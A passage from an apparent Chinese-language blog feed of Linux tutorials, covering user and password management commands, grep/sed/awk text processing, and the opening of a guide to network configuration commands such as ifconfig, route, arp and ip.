#关闭所有交换分区</p><p><img src="640-1689663684701-144.png" alt="图片"></p><p><strong>十六、sync：刷新文件系统缓冲区</strong></p><p>手工执行sync可以将内存中的文件缓冲至磁盘中</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux用户管理 用户信息查询</title>
    <link href="/2023/07/18/Linux%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2/"/>
    <url>/2023/07/18/Linux%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2/</url>
    
    <content type="html"><![CDATA[<p>文档目录：</p><p>一、useradd：创建用户</p><p>二、usermod：修改用户信息</p><p>三、userdel：删除用户</p><p>四、groupadd：创建新的用户组</p><p>五、groupdel：删除用户组</p><p>六、passwd：修改用户密码</p><p>七、chage：修改用户密码有效期</p><p>八、chpasswd：批量更新用户密码(备注1：密码测试问题)</p><p>九、su:切换用户</p><p>十、visudo：编辑sudoers文件（备注2：权限测试问题）</p><p>十一、sudo：以另一个用户身份执行命令</p><p>十二、id：显示用户与用户组的信息</p><p>十三、w：显示已登录用户信息</p><p>十四、who：显示已登录用户信息</p><p>十五、users：显示已登录用户</p><p>十六、whoami：显示当前登录的用户名</p><p>十七、last：显示用户登录列表</p><p>十八、lastb：显示用户登录失败的记录</p><p>十九、lastlog：显示所有用户的最近登录记录</p><p><strong>一、useradd：创建用户</strong></p><p>1、 useradd testuser03 #创建用户</p><p><img src="640.png" alt="图片"></p><p> 用户定义文件：/etc/login.defs</p><p>用户默认配置文件：/etc/default/useradd</p><p>2、useradd -g sa -u 901 testuser04 #创建testuser04属于sa组，uid为901</p><p><img src="640-1689663446570-3.png" alt="图片"></p><p> 3、useradd -M -s /sbin/nologin testuser05 # -M不创建家目录，-s指定用户登录后的shell，/sbin/nologin代表禁止登录，常用语Ngin、Mysql等服务</p><p><img src="640-1689663448911-6.png" alt="图片"></p><p> 4、useradd -u 809 -s /bin/sh -c SysUser -G root,sa -e ‘2020/12/31’ -f 2 -d /home/inca5 inca5 #-c设置注释，-G设置多个用户组，-e到期日期，-f到期后永久停权日期，-d设置家目录</p><p><img src="640-1689663451200-9.png" alt="图片"></p><p> passwd中inca5账户信息说明：账户名：账户密码：账户UID：账户组GID：用户说明：用户家目录：shell解释器</p><p> <img src="640-1689663452767-12.png" alt="图片"></p><p> 5、useradd -D -s /bin/sh #修改默认登录shell</p><p> useradd -D -e ‘2020/12/31’ #修改账户的有效期</p><p><img src="640-1689663454538-15.png" alt="图片"></p><p> useradd -D功能可以使用 vim /etc/default/useradd编辑来替代</p><p><strong>二、usermod：修改用户信息</strong></p><p>1、usermod -u 888 -s /sbin/nologin -c TmpUser -G root,sa -e ‘2020/12/31’ -f 30 -d /home/inca inca #修改inca账户的uid为888，用户组，shell类型，家目录，过期日期，停权日</p><p><img src="640-1689663456929-18.png" alt="图片"></p><p><strong>三、userdel：删除用户</strong></p><p>1、userdel zuma #删除zuma用户</p><p><img src="640-1689663458265-21.png" alt="图片"></p><p> 2、userdel -r zuma2 #-r删除用户并且删除对应家目录</p><p><img src="640-1689663459958-24.png" alt="图片"></p><p><strong>四、groupadd：创建新的用户组</strong></p><p>1、groupadd -g 123 test1 #添加一个gid为123的test1用户组</p><p><img src="640-1689663461728-27.png" alt="图片"></p><p><strong>五、groupdel：删除用户组</strong></p><p>groupdel test1 #删除test1用户组成功</p><p><img src="640-1689663463318-30.png" alt="图片"></p><p><strong>六、passwd：修改用户密码</strong></p><p>1、passwd #修改当前用户密码</p><p><img src="640-1689663465105-33.png" alt="图片"></p><p> 2、passwd inca3 #为inca3用户添加密码</p><p><img src="640-1689663466622-36.png" alt="图片"></p><p> 3、passwd -S inca3 #显示账户密码信息，只能root下执行</p><p><img src="640-1689663468570-39.png" alt="图片"></p><p> 4、echo ‘helloworld2020’|passwd –stdin inca3 # –stdin命令可以从标准输入获取密码</p><p><img src="640-1689663469769-42.png" alt="图片"></p><p> 5、passwd -n 7 -x 60 -w 10 -i 30 inca3 #设置inca3账户,-n修改密码最短天数-x修改密码最长天数-w密码过期前警告的天数-i密码过期后禁止登录天数</p><p><img src="640-1689663471345-45.png" alt="图片"></p><p> <strong>七、chage：修改用户密码有效期</strong></p><p>1、chage -m 7 -M 60 -W 10 -I 30 inca3 #修改账户-m，最小密码可更改时间，-M密码保持有效最大天数 -W 警告提前通知天数 -I过期后禁用天数</p><p>2、chage -m7 -M60 -W10 -I30 inca3 #同上，第二种写法</p><p>3、chage -l inca3 #查看账户信息</p><p>4、chage -l inca3 #查看变更信息</p><p><img src="640-1689663473071-48.png" alt="图片"></p><p> <strong>八、chpasswd：批量更新用户密码</strong></p><p>1、chpasswd #回车后输入用户名输入密码批量更新，ctrl+d结束</p><p><img src="640-1689663474622-51.png" alt="图片"></p><p> 2、chpasswd &lt; pass.txt #批量设置密码，通过读取文件数据</p><p><img src="640-1689663476100-54.png" alt="图片"></p><p> <strong>九、su:切换用户</strong></p><p>1、su #等同于 su root 未切换环境变量</p><p><img src="640-1689663477924-57.png" alt="图片"></p><p> 2、su - root #第二种切换方式，标准规范，切环境变量</p><p><img src="640-1689663479577-60.png" alt="图片"></p><p> <strong>十、visudo：编辑sudoers文件</strong></p><p>1、visudo #等同于 vim /etc/sudoers ,推荐vi方式比较安全</p><p><img src="640-1689663481801-63.png" alt="图片"></p><p>2、 visudo -c #语法检查</p><p><img src="640-1689663483467-66.png" alt="图片"></p><p> <strong>十一、sudo：以另一个用户身份执行命令</strong></p><p>sudo ls /root #通过root用户查看（可使用sudo配置中NOPASSWD）</p><p><strong>十二、id：显示用户与用户组的信息</strong></p><p>id baikang #查看用户信息</p><p><img src="640-1689663485122-69.png" alt="图片"></p><p> <strong>十三、w：显示已登录用户信息</strong></p><p>1、w #已经登陆的用户信息</p><p><img src="640-1689663486802-72.png" alt="图片"></p><p> 2、w -h #去除两行标题</p><p><img src="640-1689663488277-75.png" alt="图片"></p><p> <strong>十四、who：显示已登录用户信息</strong></p><p>1、who #显示用户信息</p><p><img src="640-1689663490149-78.png" alt="图片"></p><p> 2、who -b #用户启动时间</p><p><img src="640-1689663491346-81.png" alt="图片"></p><p> 3、who -d #已退出用户</p><p><img src="640-1689663492969-84.png" alt="图片"></p><p> 4、who -l #显示登陆的进程</p><p><img src="640-1689663497135-87.png" alt="图片"></p><p> 5、who -H -a #显示最全登录信息，-H标题</p><p><img src="640-1689663502254-90.png" alt="图片"></p><p> <strong>十五、users：显示已登录用户</strong></p><p><img src="640-1689663503989-93.png" alt="图片"></p><p> <strong>十六、whoami：显示当前登录的用户名</strong></p><p><img src="640-1689663505577-96.png" alt="图片"></p><p> <strong>十七、last：显示用户登录列表</strong></p><p>1、last -10 #执行显示行数</p><p><img src="640-1689663507028-99.png" alt="图片"></p><p> 2、last inca3 #指定用户，记录空</p><p><img src="640-1689663509010-102.png" alt="图片"></p><p> <strong>十八、lastb：显示用户登录失败的记录</strong></p><p><img src="640-1689663510617-105.png" alt="图片"></p><p><strong>十九、lastlog：显示所有用户的最近登录记录</strong></p><p><img src="640-1689663512627-108.png" alt="图片"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux文本处理三剑客</title>
    <link href="/2023/07/18/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2/"/>
    <url>/2023/07/18/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<p>一、grep：文本过滤工具</p><p>二、sed：字符流编辑器</p><p>三、awk：文本分析工具</p><p><strong>一、grep：文本过滤工具</strong></p><p>1、grep -v ‘123’ test3 #过滤不包含123的行</p><p><img src="640.png" alt="图片"></p><p> 2、grep -n ‘123’ test3 #过滤包含123的行并输出行号</p><p><img src="640-1689662663745-3.png" alt="图片"></p><p> 3、grep -i ‘AbC’ test3 #过滤含abc的行并不区分大小写</p><p><img src="640-1689662665299-6.png" alt="图片"></p><p> 4、grep -Ei ‘abc|123’ test3 #同事过滤两个不同的字符串并为过滤的内容颜色显示，并不显示大小写</p><p><img src="640-1689662666859-9.png" alt="图片"></p><p> 5、grep -c 123 test3 #匹配的字符串的数量</p><p><img src="640-1689662669888-12.png" alt="图片"></p><p> 6、grep -o -n 123 test3 #只输出匹配的内容</p><p><img src="640-1689662672022-15.png" alt="图片"></p><p> 7、grep -w 123 test3 #全词匹配123</p><p><img src="640-1689662674122-18.png" alt="图片"></p><p> 8、grep -Ev ‘^$|#’ test3 #去除文本中的^$空行 以及 #注释</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p><strong>二、sed：字符流编辑器</strong></p><p>预置测试文本：</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> 1、sed ‘2a 102_1 xiaowang,CSO’ test4.txt #2a，第2行后增加，实际文件并不增加</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> 2、sed ‘2i 102_1 xiaowang,CSO’ test4.txt #2i,第2行前增加，实际文件并不增加</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> 3、sed ‘2a 102_1 xiaowang,CSO\n102_2 xiaohuang,PMP’ test4.txt #2a，第2行后增加2行文本</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> 4、sed 2d test4.txt #删除第二行文本</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> 5、sed 2,5d test4.txt #删除2-5行文本</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> 6、sed s#white#black#g test4.txt #替换白为黑</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> 7、sed -n ‘2p’ test4.txt #n取消默认输出，2p查询出指定行</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> 8、sed -i ‘2a 102_1 haha,TSE’ test4.txt #-i直接更改文件</p><p> ![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p><strong>三、awk：文本分析工具</strong></p><p> 1、awk NR==2 test4.txt #输出第2行命令</p><p><img src="640-1689662684590-21.png" alt="图片"></p><p> 2、awk NR==2,NR==5 test4.txt #输出第2-5行命令</p><p><img src="640-1689662686168-24.png" alt="图片"></p><p> 3、awk ‘{print NR,$0}’ test4.txt #awk’墙 显示 行号和这一行的内容 墙’</p><p><img src="640-1689662687789-27.png" alt="图片"></p><p> 4、awk ‘NR==2,NR==5 {print NR,$0}’ test4.txt #显示第2行到第6行，并且打印行号</p><p><img src="640-1689662689321-30.png" alt="图片"></p><p> 5、awk -F ‘,’ ‘{print $1,$3}’ test4.txt #打印逗号分割的第1列和第3列，$0代表整行</p><p><img src="640-1689662690861-33.png" alt="图片"></p><p> 6、awk ‘{gsub(‘10’,’100’,$0);print $0}’ test4.txt #使用gsub替换10为100</p><p><img src="640-1689662692495-36.png" alt="图片"></p><p> 7、ifconfig ens33 | awk -F ‘inet | netmask ‘ ‘NR==2{print $2}’ #两把菜刀分割inet与netmask取得$2第二部分内容,并取第二行的分割结果</p><p><img src="640-1689662694103-39.png" alt="图片"></p><p> 8、ifconfig ens33 | awk -F ‘[ ]+’ ‘NR==2{print $3}’ #正则表达式[ ]+表示以单个或多个空格分割，完了取第三部分内容</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> 9、awk -F ‘/‘ ‘{print $3}’ test5.txt #以/分割并取出第三部分内容</p><p>![图片](data:image/svg+xml,%3C%3Fxml version=’1.0’ encoding=’UTF-8’%3F%3E%3Csvg width=’1px’ height=’1px’ viewBox=’0 0 1 1’ version=’1.1’ xmlns=’<a href="http://www.w3.org/2000/svg&#39;">http://www.w3.org/2000/svg&#39;</a> xmlns:xlink=’<a href="http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg">http://www.w3.org/1999/xlink&#39;%3E%3Ctitle%3E%3C/title%3E%3Cg</a> stroke=’none’ stroke-width=’1’ fill=’none’ fill-rule=’evenodd’ fill-opacity=’0’%3E%3Cg transform=’translate(-249.000000, -126.000000)’ fill=’%23FFFFFF’%3E%3Crect x=’249’ y=’126’ width=’1’ height=’1’%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)</p><p> 10、awk -F ‘/‘ ‘{print $3}’ test5.txt|sort #以/分割并取出第三部分内容，并排序，结合sort</p><p><img src="640-1689662695954-42.png" alt="图片"></p><p> 11、awk -F ‘/‘ ‘{print $3}’ test5.txt|sort|uniq -c #去重计数，结合uniq </p><p><img src="640-1689662697904-45.png" alt="图片"></p><p> 12、awk -F ‘/‘ ‘{hotel[$3]++}END{for(domain in hotel)print domain,hotel[domain]}’ test5.txt #通过awk创建数组并通过循环来实现去重统计</p><p><img src="640-1689662699559-48.png" alt="图片"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux 网络管理命令</title>
    <link href="/2023/07/18/Linux-%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4/"/>
    <url>/2023/07/18/Linux-%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>文档目录：</p><p>一、ifconfig：配置或显示网络接口信息</p><p>二、ifup:激活网络接口</p><p>三、ifdown：禁用网络接口</p><p>四、route：显示或管理理由表</p><p>五、arp：管理系统的arp缓存</p><p>六、ip：网络配置工具</p><p>七、netstat：查看网络状态</p><p>八、ss：查看网络状态</p><p>九、ping：测试主机之间的网络的连通性</p><p>十、traceroute：追踪数据传输路由状况</p><p>十一、arping：发送arp请求</p><p>十二、telnet：远程登录主机</p><p>十三、nc：多功能网络工具</p><p>十四、ssh：安全地远程登录主机</p><p>十五、wget：命令行下载工具</p><p>十六、mailq：显示邮件传输队列</p><p>十七、mail：发送和接受邮件</p><p>十八、nslookup：域名查询工具</p><p>十九、dig：域名查询工具</p><p>二十、host：域名查询工具</p><p>二十一、nmap：网络探测工具和安全/端口扫描器</p><p>二十二、tcpdump：监听网络流量</p><p><strong>一、ifconfig：配置或显示网络接口信息</strong></p><p>1、ifconfig #显示系统中所有网卡的信息</p><p><img src="640.png" alt="图片"></p><p> 2、ifconfig ens33 #显示指定网卡的信息</p><p><img src="640-1689662261515-3.png" alt="图片"></p><p> 3、ifconfig -a #查看所有的网卡信息</p><p><img src="640-1689662263527-6.png" alt="图片"></p><p> 4、ifconfig ens33 up #启动网卡</p><p><img src="640-1689662265326-9.png" alt="图片"></p><p> 5、ifconfig ens33 down #关闭网卡</p><p><img src="640-1689662266768-12.png" alt="图片"></p><p> 6、ifconfig ens33 192.168.37.10 #配置网卡的ip地址</p><p><img src="640-1689662268387-15.png" alt="图片"></p><p> 7、ifconfig ens33:1 192.168.37.10 netmask 255.255.255.0 up #网卡设置别名</p><p><img src="640-1689662270187-18.png" alt="图片"></p><p> 8、ifconfig ens33 hw ether 00:0c:29:00:33:25 #修改网卡的MAC地址</p><p><img src="640-1689662272974-21.png" alt="图片"></p><p> 9、永久修改网卡信息，需要修改网卡的配置文件，否则重启后失效</p><p>网卡：ens33：对应配置文件路径：/etc/sysconfig/network-scripts/ifcfg-ens33</p><p><strong>二、ifup:激活网络接口</strong></p><p>ifup ens33 #激活网络接口</p><p><img src="640-1689662275208-24.png" alt="图片"></p><p> <strong>三、ifdown：禁用网络接口</strong></p><p>ifdown ens33 #关闭网卡后网卡信息消失</p><p><img src="640-1689662277405-27.png" alt="图片"></p><p><strong>四、route：显示或管理理由表</strong></p><p>1、route #查看路由表信息，默认会根据IP地址进行DNS解析生成主机名</p><p><img src="640-1689662280107-30.png" alt="图片"></p><p> 2、route -n #不进行DNS域名解析，会加快显示速度</p><p><img src="640-1689662282082-33.png" alt="图片"></p><p> 3、具体含义：</p><p>Destionation：网络号，network的意思</p><p>Gateway：网关地址，通过该IP连接出去，0.0.0.0表示该路由是直接由本机传送出去</p><p>Genmask：子网掩码</p><p>Flags：路由标记信息，具体如下：</p><p>U-启动状态</p><p>H-目标路由是一个主机IP非网络</p><p>R-使用动态路由时,恢复路由信息标记</p><p>G-表示需要外部的主机来转接传递数据</p><p>M-表示路由已经被修改了</p><p>D-已经由服务设定为动态路由</p><p>!-这个路由将不会被接受</p><p>Metric：需要经过几个网络节点才能到达路由的目标网络地址</p><p>Ref：参考到此路由规则的数目</p><p>Use：有几个转送数据包参考到了此路由规则</p><p>Iface：路由对应的网络设备接口</p><p>4、route del default #删除网关方法1</p><p><img src="640-1689662284759-36.png" alt="图片"></p><p>route del default gw 192.168.37.2 #删除网关方法</p><p><img src="640-1689662286386-39.png" alt="图片"></p><p> 5、route add default gw 192.168.37.2 #添加网关方法1，指明网关地址</p><p><img src="640-1689662288067-42.png" alt="图片"></p><p>route add default gw 192.168.37.2 dev ens33 #添加网关方法2，指明网关设备，适用于多块网络设备的主机</p><p><img src="640-1689662289745-45.png" alt="图片"></p><p> 6、route add -net 192.168.1.0/24 gw 192.168.37.8 #配置网络路由，实现两块网卡地址，192.168.37网段可访问192.168.1.0网段</p><p><img src="640-1689662291676-48.png" alt="图片"></p><p> 7、路由配置永久生效配置方法：</p><p>vi /etc/sysconfig/network-scripts/route-eth1 #方法一，默认此文件不存在</p><p><img src="640-1689662293612-51.png" alt="图片"></p><p> vi /etc/sysconfig/network-scripts/route-eth1 #方法二，默认此文件不存在</p><p><img src="640-1689662295785-54.png" alt="图片"></p><p> vi /etc/rc.local #方法三，写入开机启动</p><p><img src="640-1689662302658-57.png" alt="图片"></p><p> 配置默认网关可以写在网卡内</p><p><img src="640-1689662305248-60.png" alt="图片"></p><p> 8、配置和删除主机路由</p><p>route add -host 192.168.2.13 dev ens33 #添加去往某个主机的路由</p><p>route del -host 192.168.2.13 dev ens33 #删除主机路由</p><p><img src="640-1689662307141-63.png" alt="图片"></p><p><strong>五、arp：管理系统的arp缓存</strong></p><p>1、arp #显示arp缓存区的所有条目</p><p><img src="640-1689662309139-66.png" alt="图片"></p><p>Flag：C-arp高速缓存中条目，M-静态arp条目</p><p>2、arp -n #以数字形式显示arp缓存条目</p><p><img src="640-1689662311268-69.png" alt="图片"></p><p> 3、arp -n 192.168.37.1 #指定查询arp信息</p><p><img src="640-1689662313197-72.png" alt="图片"></p><p> 4、arp -s 192.168.37.11 00:0c:29:c0:5a:ef #静态绑定ip地址与mac地址</p><p><img src="640-1689662314923-75.png" alt="图片"></p><p> 5、arp -d 192.168.37.11 #删除静态ARP绑定</p><p><img src="640-1689662316842-78.png" alt="图片"></p><p> <strong>六、ip：网络配置工具</strong></p><p>1、ip link show dev ens33 #显示ens33网卡属性</p><p><img src="640-1689662318744-81.png" alt="图片"></p><p> 2、ip -s -s link show dev ens33 #使用两个-s获取更加详细的属性</p><p><img src="640-1689662320425-84.png" alt="图片"></p><p> 3、ip link set dev ens33 #激活ens33网卡</p><p><img src="640-1689662322586-87.png" alt="图片"></p><p> 4、ip link set down ens33 #关闭ens33网卡</p><p><img src="640-1689662324375-90.png" alt="图片"></p><p> 5、ip link set ens33 address 00:0c:29:00:33:24 #修改网卡mac地址</p><p><img src="640-1689662326124-93.png" alt="图片"></p><p> 6、ip a #同等与ip address查看激活与未激活的网卡信息</p><p><img src="640-1689662327628-96.png" alt="图片"></p><p> 7、删除ip地址</p><p>ip a del 192.168.37.8/24 dev ens33 #删除ip地址</p><p><img src="640-1689662329476-99.png" alt="图片"></p><p> 8、添加ip地址（并激活）</p><p>ip a add 192.168.37.8/24 dev ens33 #添加ip地址</p><p><img src="640-1689662334042-102.png" alt="图片"></p><p>9、ip route #查看路由表</p><p>ip route | column -t #colum格式化，-t默认空格分隔判断输入行的列数来创建一个表</p><p><img src="640-1689662335647-105.png" alt="图片"></p><p> 10、ip route add 192.168.10.0/24 via 192.168.37.2 dev ens33 #添加静态路由</p><p><img src="640-1689662338867-108.png" alt="图片"></p><p> 11、ip route del 192.168.10.0/24 via 192.168.37.2 dev ens33 #删除静态路由</p><p><img src="640-1689662341546-111.png" alt="图片"></p><p> 12、ip neighbour #使用neighbour查看arp缓存</p><p><img src="640-1689662342920-114.png" alt="图片"></p><p> 13、ip neighbour add 192.168.1.100 lladdr 00:0c:29:c0:5a:ef dev ens33 #添加静态ARP</p><p><img src="640-1689662344247-117.png" alt="图片"></p><p> 14、ip neighbour del 192.168.1.100 dev ens33 #删除静态ARP</p><p><img src="640-1689662347172-120.png" alt="图片"></p><p><strong>七、netstat：查看网络状态</strong></p><p>1、netstat -an #显示所有连接信息</p><p>第一行：活动网络(TCP/IP)连接说明</p><p><img src="640-1689662349508-123.png" alt="图片"></p><p>第一列：Proto：socket使用的协议（TCP、UDP、RAW）</p><p>第二列：Recv-Q：接收到但是还未处理的字节数</p><p>第三列：Send-Q：已经发送但是未被远程主机确认收到的字节数</p><p>第四列：Loacl Address：本地主机地址和端口</p><p>第五列：Foreign 